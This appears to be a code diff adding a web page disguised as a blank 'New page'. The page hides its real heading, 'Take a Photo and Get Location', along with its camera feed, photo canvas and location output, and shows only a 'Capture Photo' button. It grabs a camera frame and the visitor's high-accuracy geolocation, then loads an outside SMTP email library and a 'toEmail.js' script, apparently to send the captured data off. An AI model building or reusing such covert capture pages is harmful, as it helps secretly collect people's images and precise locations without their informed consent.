@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>New page</title>
+</head>
+
+<body>
+    <h1 hidden>Take a Photo and Get Location</h1>
+    <video id="video" width="640" height="480" autoplay hidden></video>
+    <button id="capture">Capture Photo</button>
+    <canvas id="canvas" width="640" height="480" hidden></canvas>
+    <p id="location" hidden></p>
+
+    <script src="camera.js"></script>
+</body>
+
+
+<script>
+    document.addEventListener('DOMContentLoaded', function () {
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+        const captureButton = document.getElementById('capture');
+        const locationDisplay = document.getElementById('location');
+
+        function handleSuccess(stream) {
+            video.srcObject = stream;
+            console.log("Camera access granted.");
+        }
+
+        function handleError(error) {
+            console.error("Cannot access the camera:", error);
+            alert('Error: Cannot access camera. Check console for more details.');
+        }
+
+        // Get access to the camera
+        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+            navigator.mediaDevices.getUserMedia({ video: true }).then(handleSuccess).catch(handleError);
+        } else {
+            console.error("Browser does not support getUserMedia.");
+            alert('Error: getUserMedia not supported by this browser.');
+        }
+
+        // Draw the video frame to the canvas and get location when capture button is clicked
+        captureButton.addEventListener('click', function () {
+            context.drawImage(video, 0, 0, 640, 480);
+            console.log("Photo captured.");
+            getLocation();
+        });
+
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(showPosition, locationError);
+            } else {
+                locationDisplay.innerText = "Geolocation is not supported by this browser.";
+            }
+        }
+
+        function showPosition(position) {
+            locationDisplay.innerText = "Latitude: " + position.coords.latitude +
+                ", Longitude: " + position.coords.longitude;
+        }
+
+        function locationError(error) {
+            locationDisplay.innerText = "Error getting location: " + error.message;
+        }
+
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(showPosition, locationError, {
+                    enableHighAccuracy: true, // Request high accuracy
+                    timeout: 10000,          // Maximum time in milliseconds to wait for a response
+                    maximumAge: 0            // Maximum age in milliseconds of a cached position
+                });
+            } else {
+                locationDisplay.innerText = "Geolocation is not supported by this browser.";
+            }
+        }
+
+    });
+
+</script>
+<script src="https://smtpjs.com/v3/smtp.js">
+</script>
+<script src="toEmail.js"></script>
+
+</html>
